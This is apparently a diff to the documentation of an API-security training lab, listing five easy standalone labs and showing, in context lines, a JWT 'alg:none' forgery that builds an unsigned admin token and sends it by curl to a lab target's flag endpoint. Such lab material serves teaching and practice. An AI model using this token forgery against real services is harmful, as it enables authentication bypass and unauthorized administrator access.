@@ -31,3 +31,12 @@ HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -
 PAYLOAD=$(echo -n '{"user_id":1,"username":"admin","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
 TOKEN="$HEADER.$PAYLOAD."
 curl http://target:8062/api/admin/flag -H "Authorization: Bearer $TOKEN"
+
+## Standalone Easy Labs
+- 8070: API Security Easy 1 - Broken Authentication
+- 8071: API Security Easy 2 - Excessive Data Exposure
+- 8072: API Security Easy 3 - IDOR
+- 8073: API Security Easy 4 - Mass Assignment
+- 8074: API Security Easy 5 - JWT Token Tampering
+
+Each standalone lab is a self-contained PHP + Apache service with its own port and writeup.
